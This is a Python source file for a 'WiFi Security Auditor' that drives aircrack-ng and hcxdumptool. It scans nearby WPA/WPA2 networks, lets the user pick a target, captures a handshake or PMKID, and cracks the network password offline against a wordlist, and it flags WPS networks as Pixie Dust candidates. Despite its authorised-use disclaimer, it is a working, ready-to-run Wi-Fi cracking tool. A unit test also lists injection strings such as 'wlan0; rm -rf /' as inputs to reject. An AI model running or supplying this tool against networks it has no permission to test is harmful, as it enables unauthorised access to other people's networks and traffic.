#!/usr/bin/env python3
"""
WiFi Security Auditor
WPA/WPA2 penetration testing tool for authorised use only.

LEGAL: Only use on networks you own or have explicit written permission to test.
Unauthorised access to computer networks is illegal under CFAA, CMA, and equivalent laws.
"""

import argparse
import json
import os
import re
import subprocess
import sys
import tempfile
import time
from datetime import datetime

import requests

OUI_CACHE: dict[str, str] = {}


# ── Validation ────────────────────────────────────────────────────────────────

def validate_interface(name: str) -> bool:
    return bool(name and re.match(r"^[a-zA-Z0-9_-]+$", name))


# ── Prerequisite checks ───────────────────────────────────────────────────────

def check_root():
    if os.geteuid() != 0:
        print("Error: root privileges required. Run with sudo.")
        sys.exit(1)

def check_dependencies():
    missing = [t for t in ("airmon-ng", "airodump-ng", "aircrack-ng", "aireplay-ng")
               if subprocess.run(["which", t], capture_output=True).returncode != 0]
    if missing:
        print(f"Missing: {', '.join(missing)}")
        print("Install with: sudo apt install aircrack-ng")
        sys.exit(1)

def hcxdumptool_available() -> bool:
    return subprocess.run(["which", "hcxdumptool"], capture_output=True).returncode == 0

def hcxtools_available() -> bool:
    return subprocess.run(["which", "hcxpcapngtool"], capture_output=True).returncode == 0


# ── Interface management ──────────────────────────────────────────────────────

def get_interfaces() -> list[str]:
    result = subprocess.run(["iwconfig"], capture_output=True, text=True, stderr=subprocess.STDOUT)
    ifaces = []
    for line in result.stdout.splitlines():
        if "IEEE 802.11" in line or "ESSID" in line:
            iface = line.split()[0]
            if iface:
                ifaces.append(iface)
    return ifaces

def enable_monitor_mode(interface: str) -> str | None:
    subprocess.run(["airmon-ng", "check", "kill"], capture_output=True)
    result = subprocess.run(["airmon-ng", "start", interface], capture_output=True, text=True)

    match = re.search(
        r"monitor mode.*?enabled.*?on\s+'?([a-zA-Z0-9_-]+)'?",
        result.stdout, re.IGNORECASE,
    )
    if match:
        mon = match.group(1)
        if "Mode:Monitor" in subprocess.run(["iwconfig", mon], capture_output=True, text=True).stdout:
            print(f"Monitor mode: {mon}")
            return mon

    for candidate in (interface, interface + "mon"):
        if "Mode:Monitor" in subprocess.run(["iwconfig", candidate], capture_output=True, text=True).stdout:
            print(f"Monitor mode: {candidate}")
            return candidate

    print("Failed to enable monitor mode.")
    return None

def disable_monitor(interface: str):
    subprocess.run(["airmon-ng", "stop", interface], capture_output=True)
    print(f"Monitor mode disabled: {interface}")


# ── OUI vendor lookup ─────────────────────────────────────────────────────────

def lookup_vendor(bssid: str) -> str:
    """Resolve BSSID to router manufacturer via macvendors.com API (cached)."""
    prefix = bssid[:8].upper()
    if prefix in OUI_CACHE:
        return OUI_CACHE[prefix]
    try:
        r = requests.get(
            f"https://api.macvendors.com/{prefix}",
            timeout=5,
            headers={"Accept": "text/plain"},
        )
        vendor = r.text.strip() if r.status_code == 200 else ""
        # truncate long vendor names
        if len(vendor) > 22:
            vendor = vendor[:22]
    except requests.RequestException:
        vendor = ""
    OUI_CACHE[prefix] = vendor
    time.sleep(0.35)   # macvendors free tier: ~2 req/sec
    return vendor


# ── Scanning ──────────────────────────────────────────────────────────────────

def scan_networks(interface: str, scan_time: int = 15) -> list[dict]:
    print(f"Scanning ({scan_time}s) — Ctrl+C to stop early…")
    prefix = os.path.join(tempfile.gettempdir(), f"ws_{int(time.time())}")
    proc = subprocess.Popen(
        ["airodump-ng", interface, "-w", prefix, "--output-format", "csv"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    try:
        time.sleep(scan_time)
    except KeyboardInterrupt:
        pass
    finally:
        proc.terminate()
    return parse_airodump_csv(prefix + "-01.csv")


def parse_airodump_csv(path: str) -> list[dict]:
    networks = []
    try:
        with open(path, encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()
        in_nets = False
        for line in lines:
            if "BSSID" in line and "ESSID" in line:
                in_nets = True
                continue
            if in_nets and line.strip() and not line.startswith("Station"):
                parts = [p.strip() for p in line.split(",")]
                if len(parts) >= 14 and parts[13] and parts[5] != "OPN":
                    try:
                        power = int(parts[8])
                    except ValueError:
                        power = -99
                    networks.append({
                        "bssid":      parts[0],
                        "channel":    parts[3].strip(),
                        "encryption": parts[5].strip(),
                        "power":      power,
                        "essid":      parts[13].strip(),
                        "wps":        _detect_wps(line),
                        "vendor":     "",
                    })
    except Exception as e:
        print(f"Error parsing scan output: {e}")

    # sort by signal strength (less negative = stronger)
    networks.sort(key=lambda n: n["power"], reverse=True)
    return networks


def _detect_wps(line: str) -> bool:
    """WPS-enabled APs show 'WPS' in the airodump CSV privacy/cipher fields."""
    return bool(re.search(r"\bWPS\b", line, re.I))


def enrich_vendors(networks: list[dict]) -> list[dict]:
    """Fetch vendor for each unique BSSID prefix."""
    print("Resolving vendors…")
    for n in networks:
        n["vendor"] = lookup_vendor(n["bssid"])
    return networks


# ── Display ───────────────────────────────────────────────────────────────────

_tty = sys.stdout.isatty()
def _c(code: str, t: str) -> str:
    return f"\033[{code}m{t}\033[0m" if _tty else t
DIM  = lambda t: _c("2",    t)
BOLD = lambda t: _c("1",    t)
RED  = lambda t: _c("31",   t)
YEL  = lambda t: _c("33",   t)
CYN  = lambda t: _c("36",   t)


def display_networks(networks: list[dict]):
    print(f"\n{'#':<4} {'ESSID':<28} {'BSSID':<18} {'CH':<4} {'dBm':<5} {'ENC':<8} {'WPS':<5} VENDOR")
    print("-" * 92)
    for i, n in enumerate(networks, 1):
        wps_flag = RED("WPS") if n["wps"] else DIM(" — ")
        enc      = YEL(n["encryption"]) if "WPA" in n["encryption"] else n["encryption"]
        essid    = BOLD(n["essid"][:27])
        vendor   = DIM(n["vendor"][:22]) if n["vendor"] else DIM("unknown")
        print(
            f"{i:<4} {essid:<28} {CYN(n['bssid']):<18} {n['channel']:<4} "
            f"{n['power']:<5} {enc:<8} {wps_flag:<5} {vendor}"
        )


# ── Handshake capture ─────────────────────────────────────────────────────────

def capture_handshake(interface: str, bssid: str, channel: str) -> str:
    prefix = os.path.join(tempfile.gettempdir(), f"hs_{bssid.replace(':', '')}")
    print(f"Capturing handshake — {bssid} ch{channel}. Ctrl+C when done.")
    try:
        subprocess.run(
            ["airodump-ng", "--bssid", bssid, "--channel", channel, "-w", prefix, interface]
        )
    except KeyboardInterrupt:
        pass
    return prefix + "-01.cap"


def capture_pmkid(interface: str, bssid: str) -> str:
    """
    PMKID capture using hcxdumptool — does not require a connected client
    or deauthentication. Converts output to .hc22000 format for hashcat.

    Ref: https://hashcat.net/forum/thread-7717.html (Jens Steube, 2018)
    """
    if not hcxdumptool_available():
        print("hcxdumptool not found. Install with: sudo apt install hcxdumptool hcxtools")
        return ""

    out_pcapng = os.path.join(tempfile.gettempdir(), f"pmkid_{bssid.replace(':', '')}.pcapng")
    out_hc     = out_pcapng.replace(".pcapng", ".hc22000")

    filter_file = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
    filter_file.write(bssid.replace(":", "").lower() + "\n")
    filter_file.close()

    print(f"PMKID capture — {bssid} (30s). No deauth needed.")
    try:
        subprocess.run(
            [
                "hcxdumptool", "-i", interface,
                "-o", out_pcapng,
                "--filterlist_ap=" + filter_file.name,
                "--filtermode=2",
                "--enable_status=1",
            ],
            timeout=30,
        )
    except (subprocess.TimeoutExpired, KeyboardInterrupt):
        pass
    finally:
        os.unlink(filter_file.name)

    if hcxtools_available() and os.path.exists(out_pcapng):
        subprocess.run(
            ["hcxpcapngtool", "-o", out_hc, out_pcapng],
            capture_output=True,
        )
        if os.path.exists(out_hc) and os.path.getsize(out_hc) > 0:
            print(f"PMKID hash saved: {out_hc}")
            print(f"Crack with: hashcat -m 22000 {out_hc} <wordlist>")
            return out_hc
        print(f"No PMKID captured. Raw pcapng saved: {out_pcapng}")
        return out_pcapng
    return out_pcapng


# ── Cracking ──────────────────────────────────────────────────────────────────

def crack_password(cap_file: str, wordlist: str) -> str | None:
    if not os.path.exists(wordlist):
        print(f"Wordlist not found: {wordlist}")
        return None
    result = subprocess.run(
        ["aircrack-ng", cap_file, "-w", wordlist], capture_output=True, text=True
    )
    if "KEY FOUND" in result.stdout:
        for line in result.stdout.splitlines():
            if "KEY FOUND" in line:
                return line.split("[")[1].split("]")[0].strip()
    print("Password not found in wordlist.")
    return None


# ── JSON export ───────────────────────────────────────────────────────────────

def export_json(networks: list[dict], path: str):
    data = {
        "scan_time": datetime.utcnow().isoformat() + "Z",
        "networks":  networks,
    }
    with open(path, "w") as f:
        json.dump(data, f, indent=2)
    print(f"Scan results saved: {path}")


# ── Tests (no hardware required) ─────────────────────────────────────────────

def _run_unit_tests():
    import unittest

    class Tests(unittest.TestCase):
        def test_validate_interface_valid(self):
            for n in ("wlan0", "wlan0mon", "mon0", "wlp2s0"):
                self.assertTrue(validate_interface(n))

        def test_validate_interface_invalid(self):
            for n in ("", None, "wlan0; rm -rf /", "../../etc/passwd", "wlan 0"):
                self.assertFalse(validate_interface(n))

        def test_detect_wps_true(self):
            self.assertTrue(_detect_wps("AA:BB:CC:DD:EE:FF, ..., WPA2, CCMP, PSK WPS, ..."))

        def test_detect_wps_false(self):
            self.assertFalse(_detect_wps("AA:BB:CC:DD:EE:FF, ..., WPA2, CCMP, PSK, ..."))

        def test_parse_csv_sorts_by_signal(self):
            import tempfile, os
            csv = (
                "BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key\n"
                "AA:BB:CC:DD:EE:FF, 2024-01-01, 2024-01-01, 6, 54, WPA2, CCMP, PSK, -80, 10, 0, 0.0.0.0, 4, Weak, \n"
                "11:22:33:44:55:66, 2024-01-01, 2024-01-01, 1, 54, WPA2, CCMP, PSK, -40, 10, 0, 0.0.0.0, 6, Strong, \n"
            )
            f = tempfile.NamedTemporaryFile(mode="w", suffix=".csv", delete=False)
            f.write(csv); f.close()
            try:
                nets = parse_airodump_csv(f.name)
                self.assertEqual(nets[0]["essid"], "Strong")
                self.assertGreater(nets[0]["power"], nets[1]["power"])
            finally:
                os.unlink(f.name)

    loader = unittest.TestLoader()
    suite  = loader.loadTestsFromTestCase(Tests)
    runner = unittest.TextTestRunner(verbosity=2)
    runner.run(suite)


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="WiFi Security Auditor — authorised penetration testing only.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  sudo python wifi_auditor.py --list\n"
            "  sudo python wifi_auditor.py -i wlan0 -w /usr/share/wordlists/rockyou.txt\n"
            "  sudo python wifi_auditor.py -i wlan0 --pmkid\n"
            "  sudo python wifi_auditor.py --list --export scan.json\n"
        ),
    )
    parser.add_argument("-i", "--interface",  help="Wireless interface (auto-detected if omitted)")
    parser.add_argument("-w", "--wordlist",   help="Wordlist for WPA handshake cracking")
    parser.add_argument("--list",             action="store_true", help="Scan and list networks, then exit")
    parser.add_argument("--pmkid",            action="store_true", help="Use PMKID capture instead of handshake (requires hcxdumptool)")
    parser.add_argument("--no-vendor",        action="store_true", help="Skip OUI vendor lookup (faster)")
    parser.add_argument("--scan-time",        type=int, default=15, metavar="SEC")
    parser.add_argument("--export",           metavar="FILE",       help="Save scan results to JSON")
    parser.add_argument("--test",             action="store_true",  help="Run unit tests (no hardware needed)")
    args = parser.parse_args()

    if args.test:
        _run_unit_tests()
        return

    check_root()
    check_dependencies()

    interface = args.interface
    if interface:
        if not validate_interface(interface):
            print(f"Invalid interface name: {interface}")
            sys.exit(1)
    else:
        ifaces = get_interfaces()
        if not ifaces:
            print("No wireless interfaces found.")
            sys.exit(1)
        interface = ifaces[0]
        print(f"Using interface: {interface}")

    mon = enable_monitor_mode(interface)
    if not mon:
        sys.exit(1)

    try:
        networks = scan_networks(mon, scan_time=args.scan_time)
        if not networks:
            print("No WPA/WPA2 networks found.")
            sys.exit(0)

        if not args.no_vendor:
            enrich_vendors(networks)

        display_networks(networks)

        if args.export:
            export_json(networks, args.export)

        wps_targets = [n for n in networks if n["wps"]]
        if wps_targets:
            print(f"\n  {len(wps_targets)} WPS-enabled network(s) detected — potentially vulnerable to Pixie Dust attack.")

        if args.list:
            return

        try:
            choice = int(input(f"\nSelect target (1-{len(networks)}): "))
            if not 1 <= choice <= len(networks):
                raise ValueError
        except (ValueError, KeyboardInterrupt):
            print("Aborted.")
            sys.exit(0)

        target = networks[choice - 1]

        if args.pmkid:
            capture_pmkid(mon, target["bssid"])
            return

        cap = capture_handshake(mon, target["bssid"], target["channel"])
        if args.wordlist:
            password = crack_password(cap, args.wordlist)
            if password:
                print(f"Password: {BOLD(password)}")
        else:
            print(f"Handshake saved: {cap}")
            print(f"Crack with: aircrack-ng {cap} -w <wordlist>")

    except KeyboardInterrupt:
        print("\nAborted.")
    finally:
        disable_monitor(mon)


if __name__ == "__main__":
    main()
